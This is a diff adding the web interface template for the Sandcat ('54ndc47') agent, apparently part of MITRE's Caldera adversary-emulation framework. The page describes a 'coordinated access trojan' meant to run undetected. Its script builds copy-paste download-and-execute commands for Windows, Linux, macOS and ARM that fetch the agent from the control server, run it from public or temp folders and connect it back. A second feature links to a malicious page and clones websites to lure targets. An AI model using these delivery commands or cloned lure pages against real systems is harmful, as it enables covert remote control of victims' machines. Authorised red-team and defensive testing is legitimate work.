@@ -1,0 +1,134 @@
+<html>
+    <head>
+        <title>Sandcat | 54ndc47</title>
+        <link rel="shortcut icon" type="image/png" href="/gui/img/favicon.png"/>
+        <link rel="stylesheet" href="/gui/css/shared.css">
+        <link rel="stylesheet" href="/gui/css/navbar.css">
+        <link rel="stylesheet" href="/sandcat/css/basic.css">
+    </head>
+    <body>
+    <center style="margin-bottom: 100px">
+        <div class="topnav">
+          <a href="/">Home</a>
+            {% for plugin in plugins %}
+              {% if plugin.address %}
+                <a href="{{ plugin.address }}">{{ plugin.name }}</a>
+              {% endif %}
+          {% endfor %}
+          <div class="topnav-right">
+            <a href="https://github.com/mitre/caldera/wiki" target="_blank">Docs</a>
+            <a href="/logout">Logout</a>
+          </div>
+        </div>
+        <div id="notice" class="notice" style="display:none">Chrome is the only supported browser. Please change to that or some website components may not work.</div>
+
+        <div>
+            <div id="sandcat-blocks" class="row-canvas">
+                <div class="section-profile">
+                    <div class="row">
+                        <div class="column prints" style="flex:35%">
+                            <img id="pawprint" style="filter:invert(var(--invert-percentage))" src="/sandcat/img/print.png">
+                        </div>
+                        <div class="column" style="flex:65%;text-align:left">
+                            <h1 style="margin-top:-20px">54ndc47</h1>
+                            <h2 style="margin-top:-85px">coordinated access trojan (CAT)</h2>
+                            <p style="width: 75%;font-size:14px;">
+                                A sandcat is a desert cat that leaves no footprint. In that vein,
+                                54ndc47 is an agent designed to run without detection on any host operating system.
+                                It intentionally blends into the environment and executes operations.
+                            </p>
+                            <b><p style="font-size:14px;color:gold">&#9888; Use an initial access option below to deliver the agent to target hosts.</p></b>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Access -->
+
+                <div class="section-profile">
+                    <div id="access" class="row">
+                        <div class="column section-border" style="flex:50%">
+                            <h4>Option #1</h4>
+                            <p class="paragraph">
+                                Copy and paste one of the delivery commands into a terminal window.
+                            </p>
+                            <center>
+                            <div>
+                                <label><input type="radio" name="delivery" onclick="show('windows-psh')" />PowerShell</label>
+                                <label><input type="radio" name="delivery" onclick="show('windows-cmd')" />CMD</label>
+                                <label><input type="radio" name="delivery" onclick="show('linux')" />Linux</label>
+                                <label><input type="radio" name="delivery" onclick="show('darwin')" />MacOS</label>
+				<label><input type="radio" name="delivery" onclick="show('arm')" />ARM</label>
+                            </div>
+                            </center>
+                            <div class="delivery">
+                                <code id="delivery-command"></code>
+                            </div>
+                        </div>
+                        <div class="column malicious-link" style="flex:50%">
+                            <h4>Option #2</h4>
+                            <p class="paragraph">
+                                Have each targeted machine navigate to our malicious web page. Then start the downloaded
+                                54ndc47 agent. Use our sample malicious web page or overwrite it using the website
+                                cloning button below.
+                            </p>
+                            <a href="/plugin/sandcat/malicious" target="_blank">
+                                <img src="/sandcat/img/arrow.png"/>
+                            </a>
+                            <br>
+                            <input id="cloneNew" placeholder="Enter a url"/>
+                            <button type="button" class="button-success" onclick="cloneWebsite()">Clone</button>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+        </center>
+    </body>
+    <script src="/gui/jquery/jquery.js"></script>
+    <script src="/gui/js/shared.js"></script>
+    <script>
+        activate([{'download the agent': actionDownload}]);
+        function show(identity) {
+            let x = $('#delivery-command');
+            let loc = location.protocol+'//'+location.hostname+(location.port ? ':'+location.port: '');
+            if(identity === 'windows-psh') {
+                x.text('$url="' + loc + '/file/download"; $wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows"); $wc.Headers.add("file","sandcat.go"); $output="C:\\Users\\Public\\sandcat.exe";$wc.DownloadFile($url,$output); C:\\Users\\Public\\sandcat.exe -server ' + loc + ' -group my_group;');
+            } else if(identity === 'windows-cmd') {
+                x.text('$url="'+loc+'/file/download"; $wc=New-Object System.Net.WebClient; $wc.Headers.add("platform", "windows"); $wc.Headers.add("file", "sandcat.go"); $output="C:\\Users\\Public\\sandcat.exe"; $wc.DownloadFile($url, $output); cmd.exe /c C:\\Users\\Public\\sandcat.exe -server '+loc+' -group my_group -executor cmd;')
+            } else if (identity === 'linux') {
+                x.text('curl -sk -X POST -H \'file:sandcat.go\' -H \'platform:linux\' '+loc+'/file/download > /tmp/sandcat-linux && chmod +x /tmp/sandcat-linux && /tmp/sandcat-linux -server '+loc+' -group my_group;');
+            } else if (identity === 'darwin') {
+                x.text('curl -sk -X POST -H \'file:sandcat.go\' -H \'platform:darwin\' '+loc+'/file/download > /tmp/sandcat-darwin && chmod +x /tmp/sandcat-darwin && /tmp/sandcat-darwin -server '+loc+' -group my_group;');
+            } else if (identity === 'arm') {
+				x.text('curl -sk -X POST -H \'file:sandcat.go\' -H \'platform:arm\' '+loc+'/file/download > /tmp/sandcat-arm && chmod +x /tmp/sandcat-arm && /tmp/sandcat-arm -server '+loc+' -group my_group;');
+			}
+        }
+        function actionDownload(phrase){
+            $.getScript('/sandcat/js/malicious.js');
+        }
+        function cloneWebsite(){
+            let _url = document.getElementById("cloneNew").value;
+            if (validURL(_url)) {
+                let section = $('#access');
+                section.prop('disabled', true).css('opacity', 0.5);
+                $.ajax({
+                url: '/plugin/sandcat/clone?url=' + _url,
+                type: 'GET',
+                success: function(data, status, options) { section.prop('disabled', false).css('opacity', 1.0); }
+                });
+            } else {
+                alert("URL format is incorrect");
+            }
+        }
+        function validURL(str) {
+            let pattern = new RegExp('^(https?:\\/\\/)?'+ // protocol
+                '((([a-z\\d]([a-z\\d-]*[a-z\\d])*)\\.)+[a-z]{2,}|'+ // domain name
+                '((\\d{1,3}\\.){3}\\d{1,3}))'+ // OR ip (v4) address
+                '(\\:\\d+)?(\\/[-a-z\\d%_.~+]*)*'+ // port and path
+                '(\\?[;&a-z\\d%_.~+=-]*)?'+ // query string
+                '(\\#[-a-z\\d_]*)?$','i'); // fragment locator
+            return !!pattern.test(str);
+        }
+    </script>
+</html>
